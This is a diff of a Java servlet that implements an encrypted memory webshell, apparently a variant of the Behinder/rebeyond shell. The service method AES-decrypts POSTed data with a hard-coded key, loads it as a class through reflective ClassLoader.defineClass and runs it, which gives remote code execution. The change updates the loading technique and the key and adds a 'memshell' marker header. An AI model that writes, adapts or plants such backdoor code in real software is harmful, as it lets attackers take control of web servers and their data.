@@ -1,24 +1,18 @@
-package com.sorry.bug; /**
- * created by 0x22cb7139 on 2021/6/17
- */
+package com.sorry.bug;
 
 import javax.servlet.*;
-import javax.servlet.http.*;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
+import java.lang.reflect.Method;
 
+/**
+ * created by 0x22cb7139 on 2021/7/12
+ */
 public class CustomServlet implements Servlet {
-    class U extends ClassLoader {
-        U(ClassLoader c) {
-            super(c);
-        }
-
-        public Class g(byte[] b) {
-            return super.defineClass(b, 0, b.length);
-        }
-    }
     @Override
     public void init(ServletConfig servletConfig) throws ServletException {
-        System.out.println("servlet创建");
+
     }
 
     @Override
@@ -30,9 +24,10 @@ public class CustomServlet implements Servlet {
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
         HttpServletRequest req = (HttpServletRequest) servletRequest;
         HttpServletResponse rsp = (HttpServletResponse) servletResponse;
+        rsp.setHeader("inject","memshell");
         try {
             if (req.getMethod().equals("POST")) {
-                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
+                String k = "f5d7aa3ba4929cc1";
                 req.getSession().setAttribute("u", k);
                 javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                 c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
@@ -43,8 +38,10 @@ public class CustomServlet implements Servlet {
                 java.io.BufferedReader bf = req.getReader();
                 byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                 String sb = new String(evilClassBytes);
-                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
-                Object a = evilClass.newInstance();
+                Method defineclass= ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE,Integer.TYPE);
+                defineclass.setAccessible(true);
+                Class clazz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),evilClassBytes,0,evilClassBytes.length);
+                Object a = clazz.newInstance();
                 a.equals(pageContext);
                 return;
             }
